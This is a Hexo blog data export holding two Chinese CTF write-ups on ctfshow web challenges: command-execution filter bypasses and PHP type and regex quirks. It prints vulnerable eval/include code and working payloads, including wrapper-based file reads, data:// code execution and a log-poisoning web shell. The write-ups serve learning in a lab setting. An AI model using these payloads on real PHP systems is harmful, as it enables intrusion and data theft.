{"meta":{"title":"Hexo","subtitle":"","description":"","author":"Mini Full","url":"http://example.com","root":"/"},"pages":[{"title":"标签","date":"2021-11-05T09:49:44.000Z","updated":"2021-11-11T02:46:28.767Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"about","date":"2021-11-05T10:08:34.000Z","updated":"2021-11-05T10:09:07.176Z","comments":false,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"分类","date":"2021-11-05T09:39:57.000Z","updated":"2021-11-11T02:46:13.564Z","comments":false,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"404","date":"2021-11-05T10:15:10.000Z","updated":"2021-11-05T10:16:37.893Z","comments":false,"path":"404/index.html","permalink":"http://example.com/404/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-11-05T10:13:49.000Z","updated":"2021-11-05T10:13:49.522Z","comments":false,"path":"friends/index.html","permalink":"http://example.com/friends/index.html","excerpt":"","text":""}],"posts":[{"title":"ctfshow命令执行笔记","slug":"命令执行","date":"2021-11-14T08:36:03.000Z","updated":"2021-11-15T08:33:52.511Z","comments":true,"path":"2021/11/14/命令执行/","link":"","permalink":"http://example.com/2021/11/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","excerpt":"","text":"web29源码： 1234567891011121314151617181920212223&lt;php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析考点： 这题中看到两个函数 ​ eval() ​ preg_match 通过百度可知 ​ eval() 函数的功能是获取返回值 ​ preg_match 是执行正则表达式，在题中是起到一个过滤的作用。 解题： ​ 在代码中，我们可以看到过滤了 flag 而且不区分大小写 12345所需要使用的知识点 通配符 1. * 可以匹配0或多个字符 2. ? 可以匹配任意一个字符 3. [abcd] 匹配abcd中任何一个字符 4. [a-z] 匹配范围a到z，表示范围的意思 []匹配中括号中的任意一个字符 ​ 所以在这 flag 可以用 f* 或 f??? 代替 ​ 所以这个题的payload 123?c=system(&quot;cat f*.php&quot;);?c=system(&quot;cat f*&quot;);?c=system(&quot;cat f???.php&quot;); ​ 也可以使用 cp 命令 12?c=system(&quot;cp fla?.php 1.txt&quot;); //意思就是复制flag.php文件 明名为 1.txturl/1.txt //然后查看1.txt ​ 再补充一个，绕过可以用引号，反斜杠 1flag=fl\\ag=fl&#x27;&#x27;ag flag: web30源码： 1234567891011121314151617181920&lt;php/*# -*- coding: utf-8 -*-# @Author: hlxa# @Date: 2020-09-04 00:12:34# @Last: Modified by: hlxa# @Last: Modified time: 2020-09-04 00:42:36# @email: hlxa@ctfer.com# @link: http://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php/i&quot;, $c))&#123; eval($c); &#125;&#125; 分析： ​ 过滤了 flag,system,php关键字 1所需知识点反引号执行命令 ​ 因为过滤掉了 system，我们就得选择其他的命令执行函数 ​ 最常用的无需 echo 121. system();2. passthru(); ​ 需用 echo 函数 1231. 反引号 — `` 有 system() 的作用2. exec();3. shell_exec(); 实验： ​ 较上题比较，这题过滤多了 system 和 php ​ 所以 flag.php 中php可以使用 p?p 或 p* 代替 payload: 1234?c=passthru(&quot;cat fl&#x27;&#x27;ag.p?p&quot;);?c=echo (`cat fl&#x27;&#x27;ag.p?p`);?c=exec(`cp fl* 1.txt`); //然后接着访问 url/1.txt?c=shell_exec(&quot;cp f* 2.txt&quot;); //然后让问 url/2.txt flag: web31源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:49:10# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这道题比之前的题多过滤了 cat,sort,shell,反斜杠(\\),空格,点(.) 1cat 过滤时，可以代替绕过的姿势 tac: 从最后一行开始显示，是 cat 的反向显示 more: 一页一页的显示档案内容 less: 与 more 类似 head: 查看文档的前几行 tail: 查看文档的后几行 nl: 显示的时候，顺便输入行号 od: 以二进制的方式读取文档内容 vi: 一种编辑器 uniq: 查看 vim: 一种编译器 1空格过滤时，可以代替绕过的姿势 ${IFS} $IFS$1 ${IFS %20 &lt; 和 &lt;&gt; 重定向符 %09 实验： ​ 这道题过滤把主要的空格给过滤了，所以需要添加一个空格过滤符号。 ​ 这题的payload: 1234?c=echo(`more%09f*`); //more也可以写成less,nl,uniq,tac?c=passthru(&quot;tac%09f*&quot;); //tac也可以写成less,nl,uniq,more?c=echo`strings%09f*`;?c=&quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&quot;nl%09fl*&quot;); //等价于system。这个学到了! nl同样可以替换为more,less,uniq,tac,strings flag web32源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 00:56:31# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 又过滤了 shell,单引号(‘),反引号(`),echo,分号(;),括号(()) ​ 分号可以使用 ?&gt; 代替，括号可以使用 “” 绕过，所以使用文件包含的方式 实验： ​ 所以 payload 为： 1?c=include&quot;$_GET[1]&quot;?&gt;&amp;=php://filter/read=convert.base64-encode/resource=falg.php ​ 这题还可以使用伪协议 12?c=include&quot;$_POST[1]&quot;?&gt;1=php://filter/read=convert.base64-encode/resource=flag.php flag: 再使用 base64 工具转换就可以得到 flag 值 web33源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 02:22:27# @email: h1xa@ctfer.com# @link: https://ctfer.com*///error_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\\.| |\\&#x27;|\\`|echo|\\;|\\(|\\&quot;/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这题过滤多了双引号，所以在上一题 payload 的基础上，去掉双引号即可 实验： payload1 1?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php payload2 12?c=include$_POST[1]?&gt;1=php://filter/read=convert.base64-encode/resource=flag.php flag: web34多过滤了 : payload同web33 web35多过滤了 = 和 &lt; payload同web33 web36过滤掉了数字，把1换成字母就可 web37— 日志shell源码： 12345678910111213141516171819202122232425&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 05:18:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这题考的是一个协议问题，所以介绍一下各个协议的用法 12345678910111213file://协议用于访问本地文件，在CTF中通常用来读取本地文件示例： http://127.0.0.1/include.php?file://读取的路径php://协议php://访问各个输入/输出流，在CTF中经常使用的是php://filter和php://input，php://filter用于读取源码，php://input用于执行php代码示例1： php://filter/read=convert.base64-encode/resource=[文件名]示例2： http://127.0.0.1/include.php?file=php://input [POST DATA部分] &lt;?php phpinfo(); ?&gt; //现在不太能理解，先放着后面学习。data://协议通常可以用来执行PHP代码示例1： http://127.0.0.1/include.php?file=data://text/plain,命令&lt;?php%20phpinfo();?&gt;示例2： http://127.0.0.1/include.php?file=data://text/plain;base64,base64编码搬运的：https://www.cnblogs.com/z1ten9/p/14360476.html 实验： payload1： 12?c=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt;&lt;?php system(&quot;ls&quot;);?&gt; base64形式为 PD9waHAgc3lzdGVtKCdscycpOz8+ 因为题目中过滤了 flag,所以使用 base64 编码可以实现绕过 1?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg== payload2 利用日志： 1. 首先在 url 中添加一句话木马，让其记录到服务器中的日志文件中，此次题目的环境日志路径为：/var/log/nginx/access.log 1?c=&lt;?php @eval($_POST[1]);?&gt; ​ 2.访问日志文件，查看是否多了一句话木马： 蚁剑 or 中国菜刀 类似工具连接：但是失败了 flag: web38—日志shell源码： 12345678910111213141516171819202122232425&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 05:23:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 比较上题过滤多了 php,file ​ 所以 &lt;?php 写为 &lt;?= 实验： payload1: 1?c=data://text/plain,&lt;?=system(&quot;ls&quot;);?&gt; 1?c=data://text/plain;base64,PD89IHN5c3RlbSgidGFjIGYqIik7Pz4= web39源码： 1234567891011121314151617181920212223&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 06:13:21# @email: h1xa@ctfer.com# @link: https://ctfer.com*///flag in flag.phperror_reporting(0);if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/flag/i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题过滤了 flag ,然后限制了后缀不能为 php,但是使用 data:// 协议不受过滤的影响 实验： 1. 仍然使用 data:// 协议； ls 查看目录 1?c=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt; ​ 12// cat 所有 f开头的文件?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);?&gt; ​ web40源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤了 [0-9]数字，~，·，@, #, $, ^, &amp;, *, 中文括号（），-, =, +, {},[], : , ’ , “, 逗号, &lt; &gt;, 小数点, ./, ? ,一大堆 ​ 根据提示给出 payload 是使用无参数函数进行文件读取 实验： 12?c=print_r(localeconv());//localeconv() 返回包含本地数字及货币格式信息的数组其中包含小数点，正好题目过滤了小数点 12?c=print_r(pos(localeconv()));// pos() 获取数组中当前元素的值---&gt; 12?c=print_r(scandir(pos(localeconv())));// scandir() 返回指定目录中的文件和目录的数组---&gt; 此时获取到的数组下标为 1 的为 .. 12?c=print_r(array_reverse(scandir(pos(localeconv()))));// array_reverse() 翻转数组--&gt;将 scandir() 获取到的数组下标 1 的变为 flag.php 12?c=print_r(next(array_reverse(scandir(pos(localeconv())))));// next() 函数将内部指针指向数组中的下一个元素，并输出。即下一个 ———&gt; flag.php；如若在上一步 array_reverse() 不翻转将得到： .. 此时已经读取到了 flag.php 那么就要将其内容显示出来： 可以使用 show_source() 或者 highlight_file() 得到flag 12?c=show_source(next(array_reverse(scandir(pos(localeconv())))));?c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); flag: web41web42 — &gt;/dev/null 2&gt;&amp;1源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 20:51:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： /dev/null /dev/null 表示的是一个黑洞，通常用于丢弃不需要的数据输出，或者用于输入流的文件 /dev/null 作用是将标准输出重定向到 /dev/null 中。 /dev/null 代表Linux的空设备文件，往这个文件里面写入的内容都会丢失:”黑洞” 所以执行了 &gt;dev/null 之后，标准输出掉入黑洞不复存在。 2&gt;&amp;1 重定向绑定，&amp;可以将两个输出绑定在一起。所以错误输出将和标准输出同一个文件描述。 一次 &gt;/dev/null 2&gt;&amp;1 执行后：标准输出重定向到/dev/null(黑洞)中,错误输出重用来标准输出的描述，因此也掉入了黑洞。综上所述，该条命令执行后，不会有任何显示，不会输出任何信息到控制台，也不会有任何信息输出到文件中。 所以此题要把 &gt;/dev/null 2&gt;&amp;1 这部分内容截断: 12345?c=cat flag.php; // cat可以替换为 tac，nl,more，less，uniq，tail,下面的几个 flag 同样适用?c=cat flag.php%0a // %0a = 回车?c=cat flag.php%26 // %26 = &amp;?c=cat flag.php%26%26 // %26%26 = &amp;&amp;?c=cat flag.php|| // || = || flag: web43源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:32:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125;","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]},{"title":"php特性","slug":"php特性","date":"2021-11-11T02:49:11.000Z","updated":"2021-11-11T13:18:30.674Z","comments":true,"path":"2021/11/11/php特性/","link":"","permalink":"http://example.com/2021/11/11/php%E7%89%B9%E6%80%A7/","excerpt":"","text":"web89源码： 1234567891011121314151617181920212223242526&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 15:38:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if(preg_match(&quot;/[0-9]/&quot;, $num))&#123; die(&quot;no no no!&quot;); &#125; if(intval($num))&#123; echo $flag; &#125;&#125; 查看一下 intval 函数说明,就可以知道使用数组来绕过 进一步查看，可以知道 preg_match 是无法处理数组的 利用 preg_match() 函数无法处理数组的漏洞 payload: 12?num[]=9?num[]= web90源码： 123456789101112131415161718192021222324252627&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:06:11# @email: h1xa@ctfer.com# @link: https://ctfer.com*/include(&quot;flag.php&quot;);highlight_file(__FILE__);if(iseet($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; if($num===&quot;4476&quot;)&#123; die(&quot;no no no!&quot;); &#125; if(intval($num,0)===4476)&#123; echo $flag; &#125;else&#123; echo intval($num,0) &#125;&#125; 这个题也是参考 intval 函数的，只需要了解该函数的第二个参数就可以知道 payload: 123?num=0x117c?num=010574?num=4476a //a可以为任意字母 web91源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: Firebasky# @Date: 2020-09-16 11:25:09# @Last Modified by: h1xa# @Last Modified time: 2020-09-18 16:16:09# @link: https://ctfer.com*/show_source(__FILE__);include(&#x27;flag.php&#x27;);$a=$_GET[&#x27;cmd&#x27;];if(preg_match(&#x27;/^php$/im&#x27;, $a))&#123; if(preg_match(&#x27;/^php$i&#x27;, $a))&#123; echo &#x27;hacker&#x27;; &#125; else&#123; echo $flag; &#125;&#125;else&#123; echo &#x27;nonononono&#x27;;&#125;Notice: Undefined index: cmd in /var/www/html/index.php on line 15nonononono 分析： ​ 1.正则表达式：/^php$/im: ​ ^:匹配输入字符串的开始位置 ​ $:匹配输入字符串的结尾位置 ​ i:不区分大小写 ​ m:多行匹配，使边界字符串为 php 才能为针进入此if中 ​ 2.正则表示 /^php$/i: 与上一个正则相比少了多行匹配。所以突入点就是这个 m ​ 3.第二个 if 语句不能满足才能得到 flag 的意思就是 第二个 if 他不能匹配到这个字符串 php ​ 4.第一个 if 语句多行匹配到字符串 php ​ 5. 因此得让第一个多行匹配能匹配到字符串 php 而第二个不能匹配到字符串 php 就得让第一行为 php 第二行或第三行不为 php","categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}],"categories":[{"name":"ctfshow","slug":"ctfshow","permalink":"http://example.com/categories/ctfshow/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"}]}